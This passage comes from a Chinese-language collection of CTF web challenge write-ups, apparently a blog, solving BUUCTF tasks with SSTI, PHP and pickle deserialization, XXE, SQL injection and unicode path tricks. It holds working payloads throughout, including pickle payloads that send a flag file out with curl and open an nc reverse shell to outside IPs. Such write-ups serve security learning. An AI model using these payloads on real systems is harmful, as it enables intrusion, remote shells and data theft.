url=\u0026#34;http://suctf.c{}\u0026#34;.format(uni) try: if getUrl(url): print(\u0026#34;str: \u0026#34;+uni+\u0026#39; unicode: \\\\u\u0026#39;+str(hex(x))[2:]) except: pass def getUrl(url): url=url host=parse.urlparse(url).hostname if host == \u0026#39;suctf.cc\u0026#39;: return False parts=list(urlsplit(url)) host=parts[1] if host == \u0026#39;suctf.cc\u0026#39;: return False newhost=[] for h in host.split(\u0026#39;.\u0026#39;): newhost.append(h.encode(\u0026#39;idna\u0026#39;).decode(\u0026#39;utf-8\u0026#39;)) parts[1]=\u0026#39;.\u0026#39;.join(newhost) finalUrl=urlunsplit(parts).split(\u0026#39; \u0026#39;)[0] host=parse.urlparse(finalUrl).hostname if host == \u0026#39;suctf.cc\u0026#39;: return True else: return False if __name__==\u0026#39;__main__\u0026#39;: get_unicode() 先url编码，再传参\n1 /getUrl?url=file://suctf.c%E2%84%82/../../../../../etc/passwd 根据题目的提示得知，这里存有nginx服务贴上另外部分nginx的配置文件所在位置\n1 2 3 4 5 6 7 8 配置文件： /usr/local/nginx/conf/nginx.conf 配置文件存放目录：/etc/nginx 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 1 /getUrl?url=file://suctf.cℂ/../../../../../usr/local/nginx/conf/nginx.conf 找到flag所在位置\n1 /getUrl?url=file://suctf.cℂ/../../../../../usr/fffffflag [0CTF 2016]piapiapia 目录扫描有www.zip\n下载源码发现有反序列化漏洞，要读取config.php来获得flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 if($_POST[\u0026#39;phone\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;email\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;nickname\u0026#39;] \u0026amp;\u0026amp; $_FILES[\u0026#39;photo\u0026#39;]) { $username = $_SESSION[\u0026#39;username\u0026#39;]; if(!preg_match(\u0026#39;/^\\d{11}$/\u0026#39;, $_POST[\u0026#39;phone\u0026#39;])) die(\u0026#39;Invalid phone\u0026#39;); if(!preg_match(\u0026#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/\u0026#39;, $_POST[\u0026#39;email\u0026#39;])) die(\u0026#39;Invalid email\u0026#39;); if(preg_match(\u0026#39;/[^a-zA-Z0-9_]/\u0026#39;, $_POST[\u0026#39;nickname\u0026#39;]) || strlen($_POST[\u0026#39;nickname\u0026#39;]) \u0026gt; 10) die(\u0026#39;Invalid nickname\u0026#39;); $file = $_FILES[\u0026#39;photo\u0026#39;]; if($file[\u0026#39;size\u0026#39;] \u0026lt; 5 or $file[\u0026#39;size\u0026#39;] \u0026gt; 1000000) die(\u0026#39;Photo size error\u0026#39;); move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;])); $profile[\u0026#39;phone\u0026#39;] = $_POST[\u0026#39;phone\u0026#39;]; $profile[\u0026#39;email\u0026#39;] = $_POST[\u0026#39;email\u0026#39;]; $profile[\u0026#39;nickname\u0026#39;] = $_POST[\u0026#39;nickname\u0026#39;]; $profile[\u0026#39;photo\u0026#39;] = \u0026#39;upload/\u0026#39; . md5($file[\u0026#39;name\u0026#39;]); $user-\u0026gt;update_profile($username, serialize($profile)); echo \u0026#39;Update Profile Success!\u0026lt;a href=\u0026#34;profile.php\u0026#34;\u0026gt;Your Profile\u0026lt;/a\u0026gt;\u0026#39;; } 1 2 3 4 5 6 7 8 9 if($profile == null) { header(\u0026#39;Location: update.php\u0026#39;); } else { $profile = unserialize($profile); $phone = $profile[\u0026#39;phone\u0026#39;]; $email = $profile[\u0026#39;email\u0026#39;]; $nickname = $profile[\u0026#39;nickname\u0026#39;]; $photo = base64_encode(file_get_contents($profile[\u0026#39;photo\u0026#39;])); 1 2 3 4 5 6 7 8 9 public function filter($string) { $escape = array(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;); $escape = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $escape) . \u0026#39;/\u0026#39;; $string = preg_replace($escape, \u0026#39;_\u0026#39;, $string); $safe = array(\u0026#39;select\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;where\u0026#39;); $safe = \u0026#39;/\u0026#39; . implode(\u0026#39;|\u0026#39;, $safe) . \u0026#39;/i\u0026#39;; return preg_replace($safe, \u0026#39;hacker\u0026#39;, $string); } 这里利用这个过滤器来绕过，参考前面的php反序列化字符逃逸\n在nickname的位置写入大量的黑名单使得被替换，然后就能匹配后面伪造的photo值，读取config.php\n这里我们要伪造的photo为\n1 \u0026#34;;s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} 但是因为前面的nickname有长度限制要用数组绕过\n因为将nickname改为数组时，它在序列化时不会像字符一样闭合，所以要加多一个}。\n1 \u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} 1 wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\u0026#34;;}s:5:\u0026#34;photo\u0026#34;;s:10:\u0026#34;config.php\u0026#34;;} 放包之后，把图片的base64解码出来就行了\n[Zer0pts2020]Can you guess it? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 \u0026lt;?php include \u0026#39;config.php\u0026#39;; // FLAG is defined in config.php if (preg_match(\u0026#39;/config\\.php\\/*$/i\u0026#39;, $_SERVER[\u0026#39;PHP_SELF\u0026#39;])) { exit(\u0026#34;I don\u0026#39;t know what you are thinking, but I won\u0026#39;t let you read it :)\u0026#34;); } if (isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;])); exit(); } $secret = bin2hex(random_bytes(64)); if (isset($_POST[\u0026#39;guess\u0026#39;])) { $guess = (string) $_POST[\u0026#39;guess\u0026#39;]; if (hash_equals($secret, $guess)) { $message = \u0026#39;Congratulations! The flag is: \u0026#39; . FLAG; } else { $message = \u0026#39;Wrong.\u0026#39;; } } ?\u0026gt; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Can you guess it?\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Can you guess it?\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If your guess is correct, I\u0026#39;ll give you the flag.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;?source\u0026#34;\u0026gt;Source\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;?php if (isset($message)) { ?\u0026gt; \u0026lt;p\u0026gt;\u0026lt;?= $message ?\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;guess\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 下面那个hash匹配随机数肯定不行，用上面的basename的bug绕过\nPHP :: Bug #62119 :: basename broken with non-ASCII-chars\n它会去掉文件名开头的非ASCII值：\n1 2 var_dump(basename(\u0026#34;xffconfig.php\u0026#34;)); // =\u0026gt; config.php var_dump(basename(\u0026#34;config.php/xff\u0026#34;)); // =\u0026gt; config.php 这样就能绕过匹配，用config.php/%ff\n因为basename函数的特性，它会返回文件名\n$_SERVER['PHP_SELF']会获取我们当前的访问路径,我们构造index.php/config.php,就会返回config.php\n最后访问source得到flag\n1 index.php/config.php/%ff?source [MRCTF2020]套娃 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- //1st $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if( substr_count($query, \u0026#39;_\u0026#39;) !== 0 || substr_count($query, \u0026#39;%5f\u0026#39;) != 0 ){ die(\u0026#39;Y0u are So cutE!\u0026#39;); } if($_GET[\u0026#39;b_u_p_t\u0026#39;] !== \u0026#39;23333\u0026#39; \u0026amp;\u0026amp; preg_match(\u0026#39;/^23333$/\u0026#39;, $_GET[\u0026#39;b_u_p_t\u0026#39;])){ echo \u0026#34;you are going to the next ~\u0026#34;; } !--\u0026gt; $_SERVER['QUERY_STRING']这个会匹配传入的?之后的字符\n_可以用空格或者.绕过，/23333$/这个只有尾部是23333才会被匹配到\n用23333%0A绕过\n1 2 3 ?b u p t=23333%0A 或者 ?b.u.p.t=23333%0A 进入下一层，注释里面一串jsfuck丢给控制台\npost传Merak,进入下一层\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php error_reporting(0); include \u0026#39;takeip.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;.\u0026#39;); include \u0026#39;flag.php\u0026#39;; if(isset($_POST[\u0026#39;Merak\u0026#39;])){ highlight_file(__FILE__); die(); } function change($v){ $v = base64_decode($v); $re = \u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } echo \u0026#39;Local access only!\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; $ip = getIp(); if($ip!=\u0026#39;127.0.0.1\u0026#39;) echo \u0026#34;Sorry,you don\u0026#39;t have permission! Your ip is :\u0026#34;.$ip; if($ip === \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; file_get_contents($_GET[\u0026#39;2333\u0026#39;]) === \u0026#39;todat is a happy day\u0026#39; ){ echo \u0026#34;Your REQUEST is:\u0026#34;.change($_GET[\u0026#39;file\u0026#39;]); echo file_get_contents(change($_GET[\u0026#39;file\u0026#39;])); } ?\u0026gt; 这里ip要求是127.0.0.1\n添加Client-Ip:127.0.0.1\n2333参数用data协议或者php://input传post也行\n而file要加密\n1 2 3 4 5 6 7 \u0026lt;?php $v=\u0026#39;flag.php\u0026#39;; $re=\u0026#39;\u0026#39;; for($i=0;$i\u0026lt;strlen($v);$i++){ $re.=chr ( ord ($v[$i]) - $i*2 ); } echo base64_encode($re); 1 ?2333=data://text/plain,todat%20is%20a%20happy%20day\u0026amp;file=ZmpdYSZmXGI= [CSCCTF 2019 Qual]FlaskLight jinja2的ssti\n查找到warnings类在59\n但是后面就会回显500状态怀疑过滤了global\n拼接绕过\n1 [].__class__.__base__.__subclasses__()[59].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39;) 1 {{[].__class__.__base__.__subclasses__()[59].__init__[\u0026#39;__glo\u0026#39;+\u0026#39;bals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat flasklight/coomme_geeeett_youur_flek\u0026#34;).read()\u0026#39;)}} [watevrCTF-2019]Cookie Store 伪造cookie，base64编码得flag\n[WUSTCTF2020]CV Maker 注册登入，bp改为图片格式\n上传蚁剑连接\n[CISCN2019 华北赛区 Day1 Web2]ikun 上来提示爆破网站，要买到lv6,我们点开lv4的回显参数page,爆破page\n1 2 3 4 5 6 7 8 9 import requests url=\u0026#34;http://3ecc60d7-c14f-4805-9476-71bcd91747c8.node3.buuoj.cn/shop?page=\u0026#34; for i in range(0,2000): print(i) r=requests.get( url + str(i) ) if \u0026#39;lv6.png\u0026#39; in r.text: print (i) break 爆破出181\n抓包改折扣\n得到/b1g_m4mber路由,jwt伪造，key是1Kun\n查看源码后面能下载源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import tornado.web from sshop.base import BaseHandler import pickle import urllib class AdminHandler(BaseHandler): @tornado.web.authenticated def get(self, *args, **kwargs): if self.current_user == \u0026#34;admin\u0026#34;: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) else: return self.render(\u0026#39;no_ass.html\u0026#39;) @tornado.web.authenticated def post(self, *args, **kwargs): try: become = self.get_argument(\u0026#39;become\u0026#39;) p = pickle.loads(urllib.unquote(become)) return self.render(\u0026#39;form.html\u0026#39;, res=p, member=1) except: return self.render(\u0026#39;form.html\u0026#39;, res=\u0026#39;This is Black Technology!\u0026#39;, member=0) 1 p = pickle.loads(urllib.unquote(become)) 这里pickle提供了一个简单的持久化功能。用到反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 pickle.dump(obj, file, [,protocol]) 函数的功能：将obj对象序列化存入已经打开的file中。 参数讲解： obj：想要序列化的obj对象。 file:文件名称。 protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 pickle.load(file) 函数的功能：将file中的对象序列化读出。 参数讲解： file：文件名称。 pickle.dumps(obj[, protocol]) 函数的功能：将obj对象序列化为string形式，而不是存入文件中。 参数讲解： obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。 pickle.loads(string) 函数的功能：从string中读出序列化前的obj对象。 参数讲解： string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码 检测反序列化方法：全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 脚本\n1 2 3 4 5 6 7 8 9 10 import pickle import urllib class payload(object): def __reduce__(self): return (eval, (\u0026#34;open(\u0026#39;/flag.txt\u0026#39;,\u0026#39;r\u0026#39;).read()\u0026#34;,)) a = pickle.dumps(payload()) a = urllib.quote(a) print(a) 要在py2环境用\n下面这个是py3的脚本\n1 2 3 4 5 6 7 8 9 10 import pickle import urllib import commands class payload(object): def __reduce__(self): return (commands.getoutput,(\u0026#39;ls /\u0026#39;,)) a = payload() print urllib.quote(pickle.dumps(a)) 然后cat /flag.txt\n[红明谷CTF 2021]write_shell action传pwd,看目录\nsandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/\n1 ?action=upload\u0026amp;data=\u0026lt;?=%09`ls%09/`?\u0026gt; 1 ?action=upload\u0026amp;data=\u0026lt;?=%09`cat%09/flllllll1112222222lag`?\u0026gt; %09-\u0026gt;空格，反引号可以执行shell命令\n[watevrCTF-2019]Pickle Store 抓包拿cookie\n一串base64，题目提示pickle,解码后反序列化\n1 2 3 4 5 import pickle import base64 a=pickle.loads(base64.b64decode(b\u0026#39;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu\u0026#39;)) print(a) 1 {\u0026#39;money\u0026#39;: 500, \u0026#39;history\u0026#39;: [], \u0026#39;anti_tamper_hmac\u0026#39;: \u0026#39;aa1ba4de55048cf20e0a7a63b7f8eb62\u0026#39;} 可见其中带上了hmac验证。\n接下来最简单的是直接弹shell\n1 2 3 4 5 6 7 import pickle import base64 class A(object): def __reduce__(self): return (eval,(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;curl -d @flag.txt 174.0.157.204:2333\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 1 2 3 4 5 6 7 import pickle import base64 class A(object): def __reduce__(self): return (eval,(\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;curl http://119.xxx.xxx.xxx/`cat flag.txt|base64`\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 1 2 3 4 5 6 7 8 import base64 import pickle class A(object): def __reduce__(self): return (eval, (\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;nc 119.29.60.71 9999 -e/bin/sh\u0026#39;)\u0026#34;,)) a = A() print(base64.b64encode(pickle.dumps(a))) 或者cookie伪造\n首先反序列化的pickle流中包含了给key赋值的操作，反序列化后key值会被覆盖\n1 2 3 4 5 6 7 8 9 10 import pickle import hmac key=b\u0026#39;66666666666666666666666666666666\u0026#39; cookies = {\u0026#34;money\u0026#34;:10000,\u0026#34;history\u0026#34;:[]} h = hmac.new(key) h.update(str(cookies).encode()) cookies[\u0026#34;anti_tamper_hmac\u0026#34;] = h.digest().hex() result2 = pickle.dumps(cookies) print(result2) 这里把余额设置为10000，并用我们自己的key来给cookie做签名，得到的pickle流：\n1 b\u0026#34;\\x80\\x03}q\\x00(X\\x05\\x00\\x00\\x00moneyq\\x01M\\x10\u0026#39;X\\x07\\x00\\x00\\x00historyq\\x02]q\\x03X\\x10\\x00\\x00\\x00anti_tamper_hmacq\\x04X \\x00\\x00\\x00ccb487eec1cb66dda8d00a8121aeb4bfq\\x05u.\u0026#34; [RCTF2015]EasySQL 发现有二次注入，在修改密码时触发\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))# 1 2 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;flag\u0026#39;)))# admin\u0026#34;||extractvalue(1,concat(0x7e,(select(flag)from(flag))))# 假flag\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;users\u0026#39;)))# 没回显完全，但是mid,left,right,substr都被过滤了\n这里用到正则匹配regexp('^f')：查找开头f的字符串\n1 2 3 1\u0026#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;users\u0026#39;)\u0026amp;\u0026amp;(column_name)regexp(\u0026#39;^r\u0026#39;))))# 或者reverse函数倒转 admin\u0026#34;||extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)=\u0026#39;users\u0026#39;))))# 1 admin\u0026#34;||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(\u0026#39;^f\u0026#39;))))# extractvalue最多只能显示32位的原因，报错回显不能够完全显示flag的值，我们可以依然使用 reverse()函数，将flag值倒置输出，再利用sql语句将倒置部分恢复，将前后两部分flag拼接到一起，就可以获得完整的flag值。\n1 admin\u0026#34;||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(\u0026#39;^f\u0026#39;)))))# 1 2 3 a=\u0026#39;}ca0da771c04c-e69b-dab4-3f8f-e3\u0026#39; b=a[::-1] print(b) [GWCTF 2019]枯燥的抽奖 查看源码有个check.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;?php #这不是抽奖程序的源代码！不许看！ header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); session_start(); if(!isset($_SESSION[\u0026#39;seed\u0026#39;])){ $_SESSION[\u0026#39;seed\u0026#39;]=rand(0,999999999); } mt_srand($_SESSION[\u0026#39;seed\u0026#39;]); $str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; $str=\u0026#39;\u0026#39;; $len1=20; for ( $i = 0; $i \u0026lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } $str_show = substr($str, 0, 10); echo \u0026#34;\u0026lt;p id=\u0026#39;p1\u0026#39;\u0026gt;\u0026#34;.$str_show.\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; if(isset($_POST[\u0026#39;num\u0026#39;])){ if($_POST[\u0026#39;num\u0026#39;]===$str){x echo \u0026#34;\u0026lt;p id=flag\u0026gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}\u0026lt;/p\u0026gt;\u0026#34;; } else{ echo \u0026#34;\u0026lt;p id=flag\u0026gt;没抽中哦，再试试吧\u0026lt;/p\u0026gt;\u0026#34;; } } show_source(\u0026#34;check.php\u0026#34;); 利用mt_rand函数的伪随机数漏洞\n先得到种子,用php_mt_seed工具爆种子\n1 2 3 4 5 6 7 8 9 str1=\u0026#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; str2=\u0026#39;fnAeH65lyg\u0026#39; res=\u0026#39;\u0026#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+\u0026#39; \u0026#39;+str(j)+\u0026#39; \u0026#39;+\u0026#39;0\u0026#39;+\u0026#39; \u0026#39;+str(len(str1)-1)+\u0026#39; \u0026#39; break print(res) 1 2 3 4 5 6 7 8 9 \u0026lt;?php mt_srand(206304701); $str_long1 = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; $str=\u0026#39;\u0026#39;; $len1=20; for ( $i = 0; $i \u0026lt; $len1; $i++ ){ $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); } echo $str; [NCTF2019]True XML cookbook xxe注入，但是跟这个比赛之前的不一样，不能直接读flag了\n这题需要对内网的主机进行探测,我们分别读取关键文件：/etc/hosts 和 /proc/net/arp：\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///etc/hosts\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///proc/net/arp\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 找到ip169.254.1.1\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;http://169.254.1.1\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; intruder爆破c段，就是ip数字最后一个\n不对，读取/proc/net/fib_trie文件\n1 2 3 4 5 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///proc/net/fib_trie\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt; 得到10.244.166.66\n再次爆破，这里的爆破延时要设置\n爆出来长度正常的就是flag\n或者用脚本爆\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import requests as res url=\u0026#34;http://a1fb5d9d-ab10-442b-9323-727c25c3fcb6.node5.buuoj.cn:81/doLogin.php\u0026#34; rawPayload=\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;!DOCTYPE user [\u0026#39;\\ \u0026#39;\u0026lt;!ENTITY payload1 SYSTEM \u0026#34;http://10.244.166.{}\u0026#34;\u0026gt;\u0026#39;\\ \u0026#39;]\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;user\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;username\u0026gt;\u0026#39;\\ \u0026#39;\u0026amp;payload1;\u0026#39;\\ \u0026#39;\u0026lt;/username\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;password\u0026gt;\u0026#39;\\ \u0026#39;23\u0026#39;\\ \u0026#39;\u0026lt;/password\u0026gt;\u0026#39;\\ \u0026#39;\u0026lt;/user\u0026gt;\u0026#39; for i in range(1,256): payload=rawPayload.format(i) #payload=rawPayload print(str(\u0026#34;#{} =\u0026gt;\u0026#34;).format(i),end=\u0026#39;\u0026#39;) try: resp=res.post(url,data=payload,timeout=0.5) except: continue else: print(resp.text,end=\u0026#39;\u0026#39;) finally: print(\u0026#39;\u0026#39;) [CISCN2019 华北赛区 Day1 Web5]CyberPunk 在源码最下面有注释\n有个file参数可以读文件\n伪协议读所有前面的php\n1 php://filter/convert.base64-encode/resource=index.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;/var/www/html/\u0026#39;); // $file = $_GET[\u0026#34;file\u0026#34;]; $file = (isset($_GET[\u0026#39;file\u0026#39;]) ? $_GET[\u0026#39;file\u0026#39;] : null); if (isset($file)){ if (preg_match(\u0026#34;/phar|zip|bzip2|zlib|data|input|%00/i\u0026#34;,$file)) { echo(\u0026#39;no way!\u0026#39;); exit; } @include($file); } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if (isset($fetch) \u0026amp;\u0026amp; $fetch-\u0026gt;num_rows\u0026gt;0){ $row = $fetch-\u0026gt;fetch_assoc(); if(!$row) { echo \u0026#39;error\u0026#39;; print_r($db-\u0026gt;error); exit; } $msg = \u0026#34;\u0026lt;p\u0026gt;姓名:\u0026#34;.$row[\u0026#39;user_name\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;, 电话:\u0026#34;.$row[\u0026#39;phone\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;p\u0026gt;, 地址:\u0026#34;.$row[\u0026#39;address\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; } else { $msg = \u0026#34;未找到订单!\u0026#34;; } }else { $msg = \u0026#34;信息不全\u0026#34;; } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php require_once \u0026#34;config.php\u0026#34;; //var_dump($_POST); if(!empty($_POST[\u0026#34;user_name\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;address\u0026#34;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#34;phone\u0026#34;])) { $msg = \u0026#39;\u0026#39;; $pattern = \u0026#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i\u0026#39;; $user_name = $_POST[\u0026#34;user_name\u0026#34;]; $address = $_POST[\u0026#34;address\u0026#34;]; $phone = $_POST[\u0026#34;phone\u0026#34;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = \u0026#39;no sql inject!\u0026#39;; }else{ $sql = \u0026#34;select * from `user` where `user_name`=\u0026#39;{$user_name}\u0026#39; and `phone`=\u0026#39;{$phone}\u0026#39;\u0026#34;; $fetch = $db-\u0026gt;query($sql); } if($fetch-\u0026gt;num_rows\u0026gt;0) { $msg = $user_name.\u0026#34;已提交订单\u0026#34;; }else{ $sql = \u0026#34;insert into `user` ( 